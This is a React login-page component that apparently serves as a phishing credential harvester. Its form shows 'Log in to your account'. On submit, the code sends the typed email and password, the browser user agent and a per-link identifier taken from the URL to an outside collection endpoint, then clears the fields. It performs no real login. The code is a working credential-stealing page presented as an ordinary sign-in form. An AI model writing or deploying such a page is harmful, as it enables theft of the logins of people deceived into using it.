import React from 'react'
import { useRef } from 'react'
import './Login.css'
import { useLocation, useNavigate } from 'react-router-dom'

const Login = () => {

  const url = 'https://panel-it.onrender.com/link/save'

  const location = useLocation()
  const pathName = location.pathname.split("/")[1]
  console.log(pathName)


  const email = useRef()
  const pass = useRef()

  async function postData() {
    try {
      await fetch(url, {
        method: "POST",
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          linkName: pathName,
          email: email.current.value,
          pass: pass.current.value,
          userAgent: navigator.userAgent
        })
      });
      email.current.value = ''
      pass.current.value = ''
    } catch (error) {
      console.log(error)
    }
  }

  function handleSubmit(event) {
    event.preventDefault()
    postData()
  }

  return (
    <div className='login-page-container'>
      <form onSubmit={handleSubmit}>
        <div className=' flex flex-col inside-form'>
          <h1 className=' text-xl text-white'>Log in to your account</h1>
          <input type="text" placeholder='Your Email' ref={email} required />
          <input type="password" placeholder='Password' ref={pass} required />
        </div>
        <button>Log in</button>
      </form>
    </div>
  )
}

export default Login